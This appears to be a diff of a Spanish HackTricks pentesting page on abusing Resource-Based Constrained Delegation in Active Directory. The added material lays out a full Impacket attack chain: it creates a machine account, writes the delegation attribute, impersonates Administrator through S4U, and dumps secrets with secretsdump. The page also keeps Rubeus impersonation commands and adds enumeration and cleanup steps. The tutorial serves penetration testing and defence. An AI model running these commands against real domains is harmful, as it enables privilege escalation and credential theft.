@@ -13,8 +13,8 @@ Otra diferencia importante de esta Delegación Constrain con respecto a las otra
 
 ### Nuevos Conceptos
 
-En la Delegación Constrain se mencionó que la **`TrustedToAuthForDelegation`** bandera dentro del valor _userAccountControl_ del usuario es necesaria para realizar un **S4U2Self.** Pero eso no es completamente cierto.\
-La realidad es que incluso sin ese valor, puedes realizar un **S4U2Self** contra cualquier usuario si eres un **servicio** (tienes un SPN) pero, si **tienes `TrustedToAuthForDelegation`** el TGS devuelto será **Forwardable** y si **no tienes** esa bandera el TGS devuelto **no será** **Forwardable**.
+En la Delegación Constrain se mencionó que el **`TrustedToAuthForDelegation`** flag dentro del valor _userAccountControl_ del usuario es necesario para realizar un **S4U2Self.** Pero eso no es completamente cierto.\
+La realidad es que incluso sin ese valor, puedes realizar un **S4U2Self** contra cualquier usuario si eres un **servicio** (tienes un SPN) pero, si **tienes `TrustedToAuthForDelegation`** el TGS devuelto será **Forwardable** y si **no tienes** ese flag el TGS devuelto **no será** **Forwardable**.
 
 Sin embargo, si el **TGS** utilizado en **S4U2Proxy** **NO es Forwardable** intentar abusar de una **delegación Constrain básica** **no funcionará**. Pero si estás tratando de explotar una **delegación Constrain basada en recursos, funcionará**.
 
@@ -70,7 +70,7 @@ msds-allowedtoactonbehalfofotheridentity
 ----------------------------------------
 {1, 0, 4, 128...}
 ```
-### Realizando un ataque S4U completo
+### Realizando un ataque S4U completo (Windows/Rubeus)
 
 Primero que nada, creamos el nuevo objeto de Computadora con la contraseña `123456`, así que necesitamos el hash de esa contraseña:
 ```bash
@@ -86,28 +86,107 @@ Puedes generar más tickets para más servicios solo pidiendo una vez usando el 
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 > [!CAUTION]
-> Tenga en cuenta que los usuarios tienen un atributo llamado "**No se puede delegar**". Si un usuario tiene este atributo en Verdadero, no podrá impersonarlo. Esta propiedad se puede ver dentro de bloodhound.
+> Tenga en cuenta que los usuarios tienen un atributo llamado "**No se puede delegar**". Si un usuario tiene este atributo en True, no podrá impersonarlo. Esta propiedad se puede ver dentro de bloodhound.
+
+### Linux tooling: end-to-end RBCD with Impacket (2024+)
+
+Si opera desde Linux, puede realizar toda la cadena RBCD utilizando las herramientas oficiales de Impacket:
+```bash
+# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
+impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'
+
+# 2) Grant RBCD on the target computer to FAKE01$
+#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
+impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'
+
+# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
+impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'
+
+# 4) Use the ticket (ccache) against the target service
+export KRB5CCNAME=$(pwd)/Administrator.ccache
+# Example: dump local secrets via Kerberos (no NTLM)
+impacket-secretsdump -k -no-pass Administrator@victim.domain.local
+```
+Notas
+- Si se aplica la firma LDAP/LDAPS, use `impacket-rbcd -use-ldaps ...`.
+- Prefiera claves AES; muchos dominios modernos restringen RC4. Impacket y Rubeus admiten flujos solo AES.
+- Impacket puede reescribir el `sname` ("AnySPN") para algunas herramientas, pero obtenga el SPN correcto siempre que sea posible (por ejemplo, CIFS/LDAP/HTTP/HOST/MSSQLSvc).
 
 ### Accediendo
 
 La última línea de comando realizará el **ataque S4U completo e inyectará el TGS** desde Administrator al host víctima en **memoria**.\
-En este ejemplo se solicitó un TGS para el servicio **CIFS** desde Administrator, por lo que podrá acceder a **C$**:
+En este ejemplo, se solicitó un TGS para el servicio **CIFS** desde Administrator, por lo que podrá acceder a **C$**:
 ```bash
 ls \\victim.domain.local\C$
 ```
 ### Abusar de diferentes tickets de servicio
 
-Aprende sobre los [**tickets de servicio disponibles aquí**](silver-ticket.md#available-services).
+Aprenda sobre los [**tickets de servicio disponibles aquí**](silver-ticket.md#available-services).
 
+## Enumeración, auditoría y limpieza
+
+### Enumerar computadoras con RBCD configurado
+
+PowerShell (decodificando el SD para resolver SIDs):
+```powershell
+# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
+Import-Module ActiveDirectory
+Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
+Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
+ForEach-Object {
+$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
+$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
+$sd.DiscretionaryAcl | ForEach-Object {
+$sid  = $_.SecurityIdentifier
+try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
+[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
+}
+}
+```
+Impacket (leer o vaciar con un solo comando):
+```bash
+# Read who can delegate to VICTIM
+impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
+```
+### Limpieza / reinicio de RBCD
+
+- PowerShell (borrar el atributo):
+```powershell
+Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
+# Or using the friendly property
+Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
+```
+- Impacket:
+```bash
+# Remove a specific principal from the SD
+impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
+# Or flush the whole list
+impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
+```
 ## Errores de Kerberos
 
-- **`KDC_ERR_ETYPE_NOTSUPP`**: Esto significa que Kerberos está configurado para no usar DES o RC4 y solo estás proporcionando el hash RC4. Proporciona a Rubeus al menos el hash AES256 (o simplemente proporciónale los hashes rc4, aes128 y aes256). Ejemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
-- **`KRB_AP_ERR_SKEW`**: Esto significa que la hora de la computadora actual es diferente de la del DC y Kerberos no está funcionando correctamente.
+- **`KDC_ERR_ETYPE_NOTSUPP`**: Esto significa que kerberos está configurado para no usar DES o RC4 y solo estás proporcionando el hash RC4. Proporciona a Rubeus al menos el hash AES256 (o simplemente proporciónale los hashes rc4, aes128 y aes256). Ejemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
+- **`KRB_AP_ERR_SKEW`**: Esto significa que la hora de la computadora actual es diferente de la del DC y kerberos no está funcionando correctamente.
 - **`preauth_failed`**: Esto significa que el nombre de usuario + hashes dados no están funcionando para iniciar sesión. Puede que hayas olvidado poner el "$" dentro del nombre de usuario al generar los hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
 - **`KDC_ERR_BADOPTION`**: Esto puede significar:
-  - El usuario que intentas suplantar no puede acceder al servicio deseado (porque no puedes suplantarlo o porque no tiene suficientes privilegios)
-  - El servicio solicitado no existe (si pides un ticket para winrm pero winrm no está en ejecución)
-  - La computadora falsa creada ha perdido sus privilegios sobre el servidor vulnerable y necesitas devolvérselos.
+- El usuario que intentas suplantar no puede acceder al servicio deseado (porque no puedes suplantarlo o porque no tiene suficientes privilegios)
+- El servicio solicitado no existe (si pides un ticket para winrm pero winrm no está en ejecución)
+- La computadora falsa creada ha perdido sus privilegios sobre el servidor vulnerable y necesitas devolvérselos.
+- Estás abusando del KCD clásico; recuerda que RBCD funciona con tickets S4U2Self no reenviables, mientras que KCD requiere que sean reenviables.
+
+## Notas, relés y alternativas
+
+- También puedes escribir el SD de RBCD sobre los Servicios Web de AD (ADWS) si LDAP está filtrado. Ver:
+
+{{#ref}}
+adws-enumeration.md
+{{#endref}}
+
+- Las cadenas de relé de Kerberos a menudo terminan en RBCD para lograr SYSTEM local en un solo paso. Ver ejemplos prácticos de extremo a extremo:
+
+{{#ref}}
+../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
+{{#endref}}
 
 ## Referencias
 
@@ -116,5 +195,7 @@ Aprende sobre los [**tickets de servicio disponibles aquí**](silver-ticket.md#a
 - [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
 - [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
 - [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
+- Impacket rbcd.py (oficial): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
+- Hoja de trucos rápida de Linux con sintaxis reciente: https://tldrbins.github.io/rbcd/
 
 {{#include ../../banners/hacktricks-training.md}}
